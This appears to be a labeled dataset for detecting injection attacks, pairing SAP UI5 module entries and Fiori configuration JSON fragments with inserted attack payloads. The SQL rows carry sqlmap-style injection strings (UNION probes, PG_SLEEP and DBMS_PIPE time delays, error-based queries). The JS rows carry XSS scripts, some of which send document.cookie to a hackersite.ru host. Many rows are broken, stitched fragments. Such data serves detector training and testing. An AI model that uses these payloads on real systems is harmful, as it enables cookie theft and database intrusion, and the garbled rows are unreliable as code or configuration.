,language,source
0,xml,"<module name=""sap/ui/core/Core.js""/>"""
1,xml,"<module name=""sap/ui/core/library.js""/>"""
2,xml,"<module name=""sap/ui/thirdparty/d3.js"" conditional=""true""/>"""
3,xml,"<module name=""sap/ui/thirdparty/jqueryui/jquery-ui-core.js"" conditional=""true""/>"""
4,xml,"<module name=""sap/ui/thirdparty/jqueryui/jquery-ui-widget.js"" conditional=""true""/>"""
5,xml,"<module name=""sap/ui/thirdparty/jqueryui/jquery-ui-mouse.js"" conditional=""true""/>"""
6,xml,"<module name=""sap/ui/thirdparty/jqueryui/jquery-ui-draggable.js"" conditional=""true""/>"""
7,xml,"<module name=""sap/ui/thirdparty/jqueryui/jquery-ui-droppable.js"" conditional=""true""/>"""
8,xml,"<module name=""sap/viz/libs/canvg.js"" conditional=""true""/>"""
9,xml,"<module name=""sap/viz/libs/rgbcolor.js"" conditional=""true""/>"""
10,xml,"<module name=""sap/viz/libs/sap-viz-info.js"" conditional=""true""/>"""
11,xml,"<module name=""jquery.sap.global.js""/>"""
12,xml,"</requires>"""
13,xml,"<includes>"""
14,xml,"<module name=""sap/viz/ui5/types/Area_drawingEffect.js""/>"""
15,xml,"<module name=""sap/viz/ui5/types/Area_marker_shape.js""/>"""
16,xml,"<module name=""sap/viz/ui5/types/Area_mode.js""/>"""
17,xml,"<module name=""sap/viz/ui5/types/Area_orientation.js""/>"""
18,xml,"<module name=""sap/viz/ui5/types/Axis_gridline_type.js""/>"""
19,xml,"<module name=""sap/viz/ui5/types/Axis_label_unitFormatType.js""/>"""
20,xml,"<module name=""sap/viz/ui5/types/Axis_position.js""/>"""
21,xml,"<module name=""sap/viz/ui5/types/Axis_type.js""/>"""
22,xml,"<module name=""sap/viz/ui5/types/Background_direction.js""/>"""
23,xml,"<module name=""sap/viz/ui5/types/Background_drawingEffect.js""/>"""
24,xml,"<module name=""sap/viz/ui5/types/Bar_drawingEffect.js""/>"""
25,xml,"<module name=""sap/viz/ui5/types/Bar_orientation.js""/>"""
26,xml,"<module name=""sap/viz/ui5/types/Bubble_drawingEffect.js""/>"""
27,xml,"<module name=""sap/viz/ui5/types/Bullet_drawingEffect.js""/>"""
28,xml,"<module name=""sap/viz/ui5/types/Bullet_orientation.js""/>"""
29,xml,"<module name=""sap/viz/ui5/types/Combination_drawingEffect.js""/>"""
30,xml,"<module name=""sap/viz/ui5/types/Combination_orientation.js""/>"""
0,json,"{ ""generation"": [{""templateId"": ""fioriw4template.fullScreen"",""templateVersion"": ""1.4.0"",""dateTimeStamp"": ""Fri, 30 Jan 2015 14:11:30 GMT""}], ""translation"": {""translationDomain"": """", ""supportedLanguages"": ""en,fr,de"", ""defaultLanguage"": ""en"", ""defaultI18NPropertyFile"": ""i18n.properties"", ""resourceModelName"": ""willy"" }, ""mockpreview"": { ""mockUri"": """", ""loadCustomRequests"": true }}"""
1,json,"tmp/apf/config/odata/AnalyticalConfiguration.xsodata/AnalyticalConfigurationQueryResults('ID_7891')"" "
2,json,"{\""steps\"":[{\""type\"":\""step\"",\""id\"":\""ReceivablesandOverdueReceivablesbyCustomer\"",\""request\"":\""requestReceivablesandOverdueReceivablesbyCustomer\"",\""binding\"":\""bindingReceivablesandOverdueReceivablesbyCustomer\"",\""title\"":{\""type\"":\""label\"",\""kind\"":\""text\"",\""key\"":\""titleStep-ReceivablesandOverdueReceivables\"""
3,json,":{\""type\"":\""label\"",\""kind\"":\""text\"",\""key\"":\""OverdueDebitAmtInDisplayCrcy_Ekey\""}"""
4,json,"},\""leftLower\"":{\""type\"":\""label\"",\""kind\"":\""text\"",\""key\"":\""dummy\""},\""rightUpper\"""
5,json,":{\""type\"":\""label\"",\""kind\"":\""text\"",\""key\"":\""dummy\""},\""rightLower\"":{\""type\"":\""label\"",\"""
6,json,":\""text\"",\""key\"":\""Customerkey\""}},\""categories\"":[{\""type\"":\""category\"",\""id\"""
7,json,":\""Customer\""}]},{\""type\"":\""step\"",\""id\"":\""RevenuebyCustomerCountry\"",\""request\"""
8,json,":\""requestRevenuebyCustomerCountry\"",\""binding\"":\""bindingRevenueByCustomerCountry\"""
9,json,",\""title\"":{\""type\"":\""label\"",\""kind\"":\""text\"",\""key\"":\""titleStep-RevenuebyCustomerCountry\""},\"""
10,json,":{\""type\"":\""label\"",\""kind\"":\""text\"",\""key\"":\""longTitleStep-RevenuebyCustomerCountry\"""
11,json,"},\""thumbnail\"":{\""type\"":\""thumbnail\"",\""leftUpper\"":{\""type\"":\""label\"",\""kind\"":\""text\"",\""key\"":\""RevenueAmountInDisplayCrcy_Ekey\""},\""leftLower\"":{\""type\"":\""label\"",\""kind\"""
12,json,":\""text\"",\""key\"":\""CustomerCountryNamekey\""}},\""categories\"":[{\""type\"":\""category\"",\""id\"":\""CustomerCountry\""}]},{\""type\"":\""step\"",\""id\"":\""RevenuebyCustomerCountryMapping\"",\""request\"":\"""
13,json,":{\""requestForMappedFilter\"":\""CustomerQuery\"",\""target\"":[\""Customer\""],\""keepSource\"":\""false\""},\""title\"":{\""type\"":\""label\"",\""kind\"":\""text\"",\""key\"":\""titleStep-RevenuebyCustomerCountryMapToCustomer\"""
14,json,":{\""type\"":\""label\"",\""kind\"":\""text\"",\""key\"":\""RevenueAmountInDisplayCrcy_Ekey\""},\""leftLower\"":{\""type\"":\""label\"",\""kind\"":\""text\"",\""key\"":\""dummy\""},\""rightUpper\"""
15,json,",\""key\"":\""longTitleStep-ReceivablesbyCustomerCountry\""},\""thumbnail\"":{\""type\"":\""thumbnail\"",\""leftUpper\"":{\""type\"":\""label\"",\""kind\"":\""text\"",\""key\"""
16,json,":\""label\"",\""kind\"":\""text\"",\""key\"":\""dummy\""},\""rightUpper\"":{\""type\"":\""label\"",\""kind\"":\""text\"",\""key\"":\""dummy\"""
17,json,",\""key\"":\""CustomerCountryNamekey\""}},\""categories\"":[{\""type\"":\""category\"",\""id\"":\""CustomerCountry\""}]},{\"""
18,json,"label\"",\""kind\"":\""text\"",\""key\"":\""titleStep-RevenuebyCustomer\""},\""longTitle\"":{\""type\"":\""label\"",\""kind\"":\""text\"",\""key\"":\""longTitleStep-RevenuebyCustomer\"""
19,json,"},\""thumbnail\"":{\""type\"":\""thumbnail\"",\""leftUpper\"":{\""type\"":\""label\"",\""kind\"":\""text\"",\"""
20,json,":\""longTitleStep-RevenuebyCustomeroverTime\""},\""thumbnail\"":{\""type\"":\""thumbnail\"",\""leftUpper\"":{\""type\"""
21,json,":\""label\"",\""kind\"":\""text\"",\""key\"":\""RevenueAmountInDisplayCrcy_Ekey\""},\""leftLower\"""
22,json,":{\""type\"":\""label\"",\""kind\"":\""text\"",\""key\"":\""DebitAmtInDisplayCrcy_Ekey\""},\""leftLower\"":{\""type\"":\""label\"",\""kind\"":\""text\"",\""key\"":\""dummy\""},\""rightUpper\"":{\""type\"":\"""
23,json,":\""longTitleStep-RevenueandReceivablesoverTime\""},\""thumbnail\"":{\""type\"":\""thumbnail\"",\""leftUpper\"":{\""type\"":\"""
24,json,":\""Time\""}]},{\""type\"":\""step\"",\""id\"":\""RevenueandReceivablesbyCustomer\"",\""request\"":\"""
25,json,"RevenueandReceivablesbyCustomer\""},\""thumbnail\"":{\""type\"":\""thumbnail\"",\""leftUpper\"":{\""type\"":\""label\"",\""kind\"":\"""
26,json,"},\""longTitle\"":{\""type\"":\""label\"",\""kind\"":\""text\"",\""key\"":\""longTitleStep-ListofOpenReceivables\"""
27,json,"},\""thumbnail\"":{\""type\"":\""thumbnail\"",\""leftUpper\"":{\""type\"":\""label\"",\""kind\"":\""text\"",\""key\"":\"""
28,json,"\,\""rightUpper\"":{\""type\"":\""label\"",\""kind\"":\""text\"",\""key\"":\""dummy\""},\""rightLower\"""
29,json,":{\""type\"":\""label\"",\""kind\"":\""text\"",\""key\"":\""dummy\""}},\""categories\"":[{\""type\"":\"""
30,json,"\"":[{\""type\"":\""category\"",\""id\"":\""Time\"",\""label\"":{\""type\"":\""label\"",\""kind\"":\""text\"""
0,sql,"{ ""generation"": [{""templateId"": ""fioriw4template.fullScreen"",""templateVersion"": ""1.4.0"",""dateTimeStamp"": ""id = 1 % ' UNION ALL SELECT NULL , NULL , NULL , NULL - - vGXN""}], ""translation"": {""translationDomain"": """", ""supportedLanguages"": ""en,fr,de"", ""defaultLanguage"": ""en"", ""defaultI18NPropertyFile"": ""i18n.properties"", ""resourceModelName"": ""willy"" }, ""mockpreview"": { ""mockUri"": """", ""loadCustomRequests"": true }}"""
1,sql,"tmp/apf/config/odata/AnalyticalConfiguration.xsodata/AnalyticalConfigurationQueryResults('ID_7891')"" "
2,sql,"{\""steps\"":[{\""type\"":\""step\"",\""id\"":\""ReceivablesandOverdueReceivablesbyCustomer\"",\""request\"":\""requestReceivablesandOverdueReceivablesbyCustomer\"",\""binding\"":\""bindingReceivablesandOverdueReceivablesbyCustomer\"",\""title\"":{\""type\"":\""label\"",\""kind\"":\""text\"",\""key\"":\""SELECT 6592 FROM PG_SLEEP ( 5 ) ) AND ( ' bARY ' = ' bARY"""
3,sql,":{\""type\"":\""+CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 9533 = 9533 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 )"",\""kind\"":\""text\"",\""key\"":\""OverdueDebitAmtInDisplayCrcy_Ekey\""}"""
4,sql,"},\""leftLower\"":{\""type\"":\""label\"",\""kind\"":\""text\"",\""key\"":\""dummy\""},\""SELECT ( CASE WHEN ( 4249 = 4249 ) THEN 1 ELSE 0 END ) FROM DUAL ) | | CHR ( 113 ) | | CHR ( 113 )"""
5,sql,":{\""type\"":\""select * from table order by 1\"",\""kind\"":\""text\"",\""key\"":\""dummy\""},\""rightLower\"":{\""type\"":\""label\"",\"""
6,sql,":\""text\"",\""key\"":\""CREATE TABLE Salaries( CheckNum INTEGER PRIMARY KEY, Amount DECIMAL(,) NOT NULL ); INSERT INTO Salaries\""}},\""categories\"":[{\""type\"":\""category\"",\""id\"""
7,sql,":\""Customer\""}]},{\""type\"":\""step\"",\""id\"":\""RevenuebyCustomerCountry\"",\""declare v_num number():='&Digite_o_primeiro_numero'; v_num number():='&Digite_o_segundo_numero'; v_soma number();\"""
8,sql,":\""requestRevenuebyCustomerCountry\"",\""binding\"":\""CREATE SEQUENCE customer_seq START WITH ; SELECT customer_seq curval from dual;\"""
9,sql,",\""title\"":{\""type\"":\""label\"",\""kind\"":\""INSERT INTO CosineTable VALUES (,), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.), (,.)\"",\""key\"":\""titleStep-RevenuebyCustomerCountry\""},\"""
10,sql,":{\""type\"":\""INSERT INTO Salaries (CheckNum, Amount) VALUES (,), (,), (,), (,), (,), (,.), (,); SELECT Amount, MOST_FREQUENT FROM(SELECT Amount, COUNT(Amount) MOST_FREQUENT FROM TABLENAME GROUP BY Amount ORDER BY COUNT(Amount) DESC) WHERE ROWNUM =;;;;;;;;;;\"",\""kind\"":\""text\"",\""key\"":\""longTitleStep-RevenuebyCustomerCountry\"""
11,JS,"},\""thumbnail\"":{\""type\"":\""thumbnail\"",\""leftUpper\"":{\""type\"":\""label\"",\""kind\"":\""<script>alert(«cookie: «+ document.cookie )</script>\"",\""key\"":\""RevenueAmountInDisplayCrcy_Ekey\""},\""leftLower\"":{\""type\"":\""label\"",\""kind\"""
12,JS,":\""text\"",\""key\"":\""CustomerCountryNamekey\""}},\""categories\"":[{\""type\"":\""<script>alert(«cookie: «+ document.cookie )</script>\"",\""id\"":\""CustomerCountry\""}]},{\""type\"":\""step\"",\""id\"":\""RevenuebyCustomerCountryMapping\"",\""request\"":\"""
13,JS,":{\""requestForMappedFilter\"":\""CustomerQuery\"",\""target\"":[\""Customer\""],\""keepSource\"":\""false\""},\""title\"":{\""type\"":\""label\"",\""kind\"":\""text\"",\""key\"":\""titleStep-RevenuebyCustomerCountryMapToCustomer\"""
14,JS,":{\""type\"":\""label\"",\""kind\"":\""<script>var img=new Image();img.src=""http://hackersite.ru/xss.jpg?""+ encodeURI(document.cookie);</script>\"",\""key\"":\""RevenueAmountInDisplayCrcy_Ekey\""},\""leftLower\"":{\""type\"":\""label\"",\""kind\"":\""text\"",\""key\"":\""dummy\""},\""rightUpper\"""
15,JS,",\""key\"":\""longTitleStep-ReceivablesbyCustomerCountry\""},\""thumbnail\"":{\""type\"":\""<script>var img=new Image();img.src=""http://hackersite.ru/xss.jpg?""+ encodeURI(document.cookie);</script>\"",\""leftUpper\"":{\""type\"":\""label\"",\""kind\"":\""text\"",\""key\"""
16,JS,":\""label\"",\""kind\"":\""text\"",\""key\"":\""dummy\""},\""rightUpper\"":{\""type\"":\""<script>var img=new Image();img.src=""http://hackersite.ru/xss.jpg?""+ encodeURI(document.cookie);</script>\"",\""kind\"":\""text\"",\""key\"":\""dummy\"""
17,JS,",\""key\"":\""CustomerCountryNamekey\""}},\""categories\"":[{\""type\"":\""category\"",\""id\"":\""CustomerCountry\""}]},{\"""
18,json,"label\"",\""kind\"":\""text\"",\""key\"":\""<script>var img=new Image();img.src=""http://hackersite.ru/xss.jpg?""+ encodeURI(document.cookie);</script>\""},\""longTitle\"":{\""type\"":\""label\"",\""kind\"":\""text\"",\""key\"":\""longTitleStep-RevenuebyCustomer\"""
19,JS,"},\""thumbnail\"":{\""type\"":\""thumbnail\"",\""leftUpper\"":{\""type\"":\""label\"",\""kind\"":\""<script>var img=new Image();img.src=""http://hackersite.ru/xss.jpg?""+ encodeURI(document.cookie);</script>\"",\"""
20,JS,":\""longTitleStep-RevenuebyCustomeroverTime\""},\""thumbnail\"":{\""type\"":\""<script>var img=new Image();img.src=""http://hackersite.ru/xss.jpg?""+ encodeURI(document.cookie);</script>\"",\""leftUpper\"":{\""type\""0,sql,"<module name=""sap/ui/core/Core.js>id = 1 AND 9533 IN ( SELECT ( CHAR ( 113 ) +CHAR ( 118 ) +CHAR ( 106 ) +CHAR ( 98 ) +CHAR ( 113 ) + ( SELECT ( CASE WHEN ( 9533 = 9533 ) THEN CHAR ( 49 ) ELSE CHAR ( 48 ) END ) ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 113 ) +CHAR ( 120 ) +CHAR ( 113 ) ) ) - - sFCM</module>"""
1,sql,"<module name=""sap/ui/core/library.js"">AND 9940 = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( 73 ) | | CHR ( 111 ) | | CHR ( 115 ) | | CHR ( 104 ) , 5 ) AND ( 4586 = 4586</module>"""
333,sql,"<module name=""sap/ui/thirdparty/jqueryui/jquery-ui-core.js"" conditional=""true"">CREATE TABLE Salaries( CheckNum INTEGER PRIMARY KEY, Amount DECIMAL(,) NOT NULL ); INSERT INTO Salaries (CheckNum, Amount) VALUES (,), (,), (,), (,), (,), (,), (,), (,); SELECT s.Amount, s.AmountOccurrence FROM( SELECT Amount</module>"""
4,sql,"<module name=""sap/ui/thirdparty/jqueryui/jquery-ui-widget.js"" conditional=""true"">CREATE TABLE Salaries( CheckNum INTEGER PRIMARY KEY, Amount DECIMAL(,) NOT NULL ); INSERT INTO Salaries (CheckNum, Amount) VALUES (,), (,), (,), (,), (,), (,), (,), (,); SELECT s.Amount, s.AmountOccurrence FROM( SELECT Amount</module>"""
5,sql,"<module name=""sap/ui/thirdparty/jqueryui/jquery-ui-mouse.js"" conditional=""true"">INSERT INTO Salasries (CheckNum, Amount) VALUES (,), (,), (,), (,), (,), (,.), (,); SELECT Amount, MOST_FREQUENT FROM(SELECT Amount</module>"""
6,sql,"<module name=""sap/ui/thirdparty/jqueryui/jquery-ui-draggable.js"" conditional=""true"">CREATE TABLE Salaries( CheckNum INTEGER PRIMARY KEY, Amount DECIMAL(,) NOT NULL );</module>"""
7,sql,"<module name=""sap/ui/thirdparty/jqueryui/jquery-ui-droppable.js"" conditional=""true"">INSERT INTO CUSTOMER (customerid,customername) VALUES(,'gamma'); SAVEPOINT s;</module>"""
8,sql,"<module name=""sap/viz/libs/canvg.js"" conditional=""true"">UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL - -</module>"""
9,sql,"<module name=""sap/viz/libs/rgbcolor.js"" conditional=""true"">SELECT 8610 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 8610 = 8610 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a )</module>"""
10,sql,"<module name=""sap/viz/libs/sap-viz-info.js"" conditional=""true"">SELECT 8610 FROM ( SELECT COUNT ( * ) , CONCAT ( 0x71766a6271 , ( SELECT ( ELT ( 8610 = 8610 , 1 ) ) ) , 0x7171717871 , FLOOR ( RAND ( 0 ) *2 ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a )</module>"""
11,JS,"<module name=""jquery.sap.global.js""/><script>var img=new Image();img.src=""http://hackersite.ru/xss.jpg?""+ encodeURI(document.cookie);</script>"""
12,JS,"</requires><script>var img=new Image();img.src=""http://hackersite.ru/xss.jpg?""+ encodeURI(document.cookie);</script>"""
13,JS,"<includes><script>var img=new Image();img.src=""http://hackersite.ru/xss.jpg?""+ encodeURI(document.cookie);</script>"""
14,JS,"<module name=""sap/viz/ui5/types/Area_drawingEffect.js""/><script>var img=new Image();img.src=""http://hackersite.ru/xss.jpg?""+ encodeURI(document.cookie);</script>"""
15,JS,"<module name=""sap/viz/ui5/types/Area_marker_shape.js""/><script>alert(«cookie: «+document.cookie)</script>"""
16,JS,"<module name=""sap/viz/ui5/types/Area_mode.js""/><script>alert(«cookie: «+document.cookie)</script>"""
17,JS,"<module name=""sap/viz/ui5/types/Area_orientation.js""/><script>alert(«cookie: «+document.cookie)</script>"""
18,JS,"<module name=""sap/viz/ui5/types/Axis_gridline_type.js""/><script>alert(«cookie: «+document.cookie)</script>"""
19,JS,"<module name=""sap/viz/ui5/types/Axis_label_unitFormatType.js""/><script>alert(«cookie: «+document.cookie)</script>"""
20,JS,"<module name=""sap/viz/ui5/types/Axis_position.js""/><script>alert(«cookie: «+document.cookie)</script>"
